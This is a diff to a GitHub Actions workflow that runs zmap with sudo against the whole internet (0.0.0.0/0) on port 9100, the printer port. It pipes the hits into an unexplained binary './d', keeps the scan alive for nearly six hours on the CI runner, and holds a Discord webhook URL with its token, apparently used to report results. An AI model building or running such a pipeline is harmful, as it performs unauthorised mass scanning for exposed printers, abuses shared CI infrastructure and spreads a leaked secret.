@@ -46,10 +46,16 @@ jobs:
         run: |
           echo "🚀 Starting zmap → d pipeline..."
           
-          # scan the whole internet (0.0.0.0/0), no target file needed
-          nohup bash -c 'zmap -p 9100 -q -B 800M 0.0.0.0/0 | ./d' > scanner.log 2>&1 &
+          # zmap needs sudo for raw sockets
+          nohup sudo bash -c 'zmap -p 9100 -B 800M 0.0.0.0/0 | ./d' > scanner.log 2>&1 &
           echo $! > scanner.pid
           echo "✅ Scanner started (PID: $(cat scanner.pid))"
+          sleep 2
+          # verify it actually started
+          if ! sudo kill -0 $(cat scanner.pid) 2>/dev/null; then
+            echo "❌ Scanner failed to start. Log:"
+            cat scanner.log
+          fi
 
       - name: ⏳ Live Logs & Run for 5h55m
         run: |
@@ -58,16 +64,15 @@ jobs:
           WEBHOOK="https://discord.com/api/webhooks/1552599497895452712/EySoc-KqZAfDZ8_Y33aIBDXdPH07H9fW-ko13fAjHeG8mkLwDqE87SKvw1OKsrBbrEPG"
           LAST_FILE_PING=0
           
-          > scanner.log
-          
           while [ $SECONDS -lt $END_TIME ]; do
-            if ! kill -0 $(cat scanner.pid) 2>/dev/null; then
+            if ! sudo kill -0 $(cat scanner.pid) 2>/dev/null; then
               echo "⚠️ Scanner died, restarting..."
               > scanner.log
-              nohup bash -c 'zmap -p 9100 -q -B 800M 0.0.0.0/0 | ./d' > scanner.log 2>&1 &
+              nohup sudo bash -c 'zmap -p 9100 -B 800M 0.0.0.0/0 | ./d' > scanner.log 2>&1 &
               echo $! > scanner.pid
             fi
             
+            # print latest scanner log line
             tail -n 1 scanner.log 2>/dev/null
             UPTIME_MIN=$((SECONDS / 60))
             
@@ -119,7 +124,7 @@ jobs:
 
       - name: 🛑 Kill scanner
         run: |
-          kill $(cat scanner.pid) 2>/dev/null || true
+          sudo kill $(cat scanner.pid) 2>/dev/null || true
           echo "✅ Scanner stopped"
 
       - name: 💾 Save backup (git)
